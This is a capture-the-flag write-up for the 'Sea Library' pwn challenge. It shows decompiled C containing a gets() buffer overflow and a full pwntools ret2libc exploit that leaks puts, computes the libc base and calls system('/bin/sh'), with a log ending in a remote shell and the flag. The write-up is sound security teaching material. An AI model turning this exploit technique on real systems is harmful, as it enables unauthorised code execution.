# The Sea Library

Category: Pwn

## Description

> The Sea Library contains the most curious and magical tools and they say you can find its address if you look hard enough. Ah, The Sea Library, it is the perfect place that I would like to return someday...

A binary was attached, together with a `libc` library.

## Solution

Let's run the attached binary:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/The_Sea_Library]
└─$ ./chal
        Welcome to
 ____ ____ ____ _________ ____ ____ ____ ____ ____ ____ ____
||T |||h |||e |||       |||L |||i |||b |||r |||a |||r |||y ||
||__|||__|||__|||_______|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
┌─────────────────────────────────────────────────────────────────────────┐
│ Title                  │ Author               │ Borrower   │ Return     │
│════════════════════════│══════════════════════│════════════│════════════│
│ The Great Gatsby       │ F. Scott Fitzgerald  │ Sparky     │ 2024-08-13 │
│ To Kill a Mockingbird  │ Harper Lee           │ Ace        │ 2024-09-06 │
│ 1984                   │ George Orwell        │ -          │ FREE       │
│ Pride and Prejudice    │ Jane Austen          │ Patches    │ 2024-09-21 │
│ The Lord of the Rings  │ J.R.R. Tolkien       │ Doodle     │ 2024-08-05 │
│ The Catcher in the Rye │ J.D. Salinger        │ Scout      │ 2024-09-17 │
│ Lord of the Flies      │ William Golding      │ -          │ FREE       │
│ The Hobbit             │ J.R.R. Tolkien       │ Flash      │ 2024-08-19 │
│ Moby-Dick              │ Herman Melville      │ Buddy      │ 2024-09-12 │
│ War and Peace          │ Leo Tolstoy          │ Sunny      │ 2024-08-22 │
└─────────────────────────────────────────────────────────────────────────┘
Enter the title of the book you are returning (q to quit):
```

So this is some kind of library management interface, where users can return books.

Let's check the decompilation output via Ghidra:

```c
void main(void)
{
  int iVar1;
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  if (use_helper != 0) {
    helper();
  }
  banner();
  do {
    do {
      book_list();
      iVar1 = get_book_input();
    } while (-1 < iVar1);
    puts("Can\'t find that book.\n");
  } while( true );
}

void book_list(void)
{
  long lVar1;
  undefined8 local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  int local_1c;
  
  puts(&DAT_00402118);
  printf(&DAT_00402218,"Title","Author","Borrower","Return");
  puts(&DAT_00402248);
  for (local_1c = 0; local_1c < 10; local_1c = local_1c + 1) {
    lVar1 = (long)local_1c * 0xc0;
    local_e8 = *(undefined8 *)(library + lVar1);
    local_e0 = *(undefined8 *)(library + lVar1 + 8);
    local_d8 = *(undefined8 *)(library + lVar1 + 0x10);
    local_d0 = *(undefined8 *)(&DAT_00404098 + lVar1);
    local_c8 = *(undefined8 *)(&DAT_004040a0 + lVar1);
    local_c0 = *(undefined8 *)(&DAT_004040a8 + lVar1);
    local_b8 = *(undefined8 *)(s_F._Scott_Fitzgerald_004040b0 + lVar1);
    local_b0 = *(undefined8 *)(s_F._Scott_Fitzgerald_004040b0 + lVar1 + 8);
    local_a8 = *(undefined8 *)(s_F._Scott_Fitzgerald_004040b0 + lVar1 + 0x10);
    local_a0 = *(undefined8 *)(&DAT_004040c8 + lVar1);
    local_98 = *(undefined8 *)(&DAT_004040d0 + lVar1);
    local_90 = *(undefined8 *)(&DAT_004040d8 + lVar1);
    local_88 = *(undefined8 *)(s_Sparky_004040e0 + lVar1);
    local_80 = *(undefined8 *)(&DAT_004040e8 + lVar1);
    local_78 = *(undefined8 *)(&DAT_004040f0 + lVar1);
    local_70 = *(undefined8 *)(&DAT_004040f8 + lVar1);
    local_68 = *(undefined8 *)(&DAT_00404100 + lVar1);
    local_60 = *(undefined8 *)(&DAT_00404108 + lVar1);
    local_58 = *(undefined8 *)(&DAT_00404110 + lVar1);
    local_50 = *(undefined8 *)(&DAT_00404118 + lVar1);
    local_48 = *(undefined8 *)(&DAT_00404120 + lVar1);
    local_40 = *(undefined8 *)(&DAT_00404128 + lVar1);
    local_38 = *(undefined8 *)(&DAT_00404130 + lVar1);
    local_30 = *(undefined8 *)(&DAT_00404138 + lVar1);
    printf(&DAT_00402218,&local_e8,&local_b8,&local_88,&local_58);
  }
  puts(&DAT_00402330);
  return;
}

int get_book_input(void)
{
  int iVar1;
  char local_48 [60];
  int local_c;
  
  puts("Enter the title of the book you are returning (q to quit):");
  gets(local_48);
  iVar1 = strcmp(local_48,"q");
  if (iVar1 == 0) {
    puts("Bye!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  local_c = book_index(local_48);
  if (-1 < local_c) {
    return_book(local_c);
  }
  return local_c;
}

int book_index(char *param_1)
{
  int iVar1;
  int local_c;
  
  local_c = 0;
  while( true ) {
    if (9 < local_c) {
      return -1;
    }
    iVar1 = strncmp(library + (long)local_c * 192,param_1,48);
    if (iVar1 == 0) break;
    local_c = local_c + 1;
  }
  return local_c;
}

void return_book(int param_1)
{
  memset(s_Sparky_004040e0 + (long)param_1 * 0xc0,0,0x30);
  memset(&DAT_00404110 + (long)param_1 * 0xc0,0,0x30);
  strncpy(s_Sparky_004040e0 + (long)param_1 * 0xc0,"-",0x30);
  strncpy(&DAT_00404110 + (long)param_1 * 0xc0,"FREE",0x30);
  return;
}
```

The vulnerability is pretty clear - an unbounded read into a limited buffer in `get_book_input`.  
This looks very similar to [PicoCTF's Here's a LIBC](../2021_picoCTF/Heres_a_LIBC.md), we'll use
the same strategy here:

 * Leak the address of `puts` via `puts`, and jump back to `get_book_input` to trigger a second exploit
 * Calculate the `libc` runtime base address
 * Exploit the buffer overflow in `get_book_input` for a second time, this time calling `system('/bin/sh')`.

The following `pwntools` script takes care of this:

```python
# First, generate a pwntools template using:
#  $ pwn template --host library.2024-bq.ctfcompetition.com --port 1337 ./chal

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        if core_pattern.strip() == "core":
            from pathlib import Path
            raise Exception("Please run the following command first:\n"
                            "mkdir -p {0} && "
                            "sudo bash -c 'echo {0}/core_dump > /proc/sys/kernel/core_pattern'"
                            .format(Path.home() / "core"))
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(130, n = exe.bytes)
    proc.sendline(payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {}".format(offset))
    return offset

overflow_offset = get_overflow_offset()

prompt = b"Enter the title of the book you are returning (q to quit):"

io = start()

log.info("puts() address in GOT: {}".format(hex(exe.got['puts'])))

rop = ROP(exe)
rop.call('puts', [exe.got['puts']]) # Leak address of puts() via puts()
rop.get_book_input()

log.info("First ROP Chain:\n{}".format(rop.dump()))

payload = fit({
     overflow_offset: bytes(rop)
})

io.recvuntil(prompt)

log.info("Sending payload:\n{}".format(hexdump(payload)))
io.sendline(payload)

io.recvline()

puts_addr = int.from_bytes(io.recvline(keepends = False), byteorder = "little")
log.info("puts() runtime address: {}".format(hex(puts_addr)))

libc_base = puts_addr - libc.symbols["puts"]
assert(libc_base & 0xFFF == 0)
log.info("LibC runtime base address: {}".format(hex(libc_base)))

libc.address = libc_base

rop = ROP(exe)
rop.call('puts', [exe.got['puts']]) # dummy call, align stack for XMM
rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh"))])
log.info("Second ROP Chain:\n{}".format(rop.dump()))

payload = fit({
     overflow_offset: bytes(rop)
})

io.recvuntil(prompt)

log.info("Sending payload:\n{}".format(hexdump(payload)))
io.sendline(payload)
io.recvline()

io.interactive()
```

Output:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/The_Sea_Library]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/google/The_Sea_Library/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/media/sf_CTFs/google/The_Sea_Library/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Starting local process '/media/sf_CTFs/google/The_Sea_Library/chal': pid 84855
[*] Process '/media/sf_CTFs/google/The_Sea_Library/chal' stopped with exit code -11 (SIGSEGV) (pid 84855)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/google/The_Sea_Library/core.84855'
    Arch:      amd64-64-little
    RIP:       0x4015a6
    RSP:       0x7ffdc14a7f28
    Exe:       '/media/sf_CTFs/google/The_Sea_Library/chal' (0x400000)
    Fault:     0x616161616161616a
[*] Overflow offset: 72
[+] Opening connection to library.2024-bq.ctfcompetition.com on port 1337: Done
[*] puts() address in GOT: 0x404010
[*] Loaded 7 cached gadgets for './chal'
[*] First ROP Chain:
    0x0000:         0x4011aa pop rdi; ret
    0x0008:         0x404010 [arg0] rdi = got.puts
    0x0010:         0x401050 puts
    0x0018:         0x401528 get_book_input()
[*] Sending payload:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  aa 11 40 00  00 00 00 00  │qaaa│raaa│··@·│····│
    00000050  10 40 40 00  00 00 00 00  50 10 40 00  00 00 00 00  │·@@·│····│P·@·│····│
    00000060  28 15 40 00  00 00 00 00                            │(·@·│····│
    00000068
[*] puts() runtime address: 0x7887b2538e50
[*] LibC runtime base address: 0x7887b24b8000
[*] Second ROP Chain:
    0x0000:         0x4011aa pop rdi; ret
    0x0008:         0x404010 [arg0] rdi = got.puts
    0x0010:         0x401050 puts
    0x0018:         0x4011aa pop rdi; ret
    0x0020:   0x7887b2690678 [arg0] rdi = 132524209145464
    0x0028:   0x7887b2508d70
[*] Sending payload:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  aa 11 40 00  00 00 00 00  │qaaa│raaa│··@·│····│
    00000050  10 40 40 00  00 00 00 00  50 10 40 00  00 00 00 00  │·@@·│····│P·@·│····│
    00000060  aa 11 40 00  00 00 00 00  78 06 69 b2  87 78 00 00  │··@·│····│x·i·│·x··│
    00000070  70 8d 50 b2  87 78 00 00                            │p·P·│·x··│
    00000078
[*] Switching to interactive mode
P\x8eS\xb2\x87x
$ ls
chal
$ ls /
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /flag
CTF{7h3_L1bRAry_i5_4lway5_FUn}
```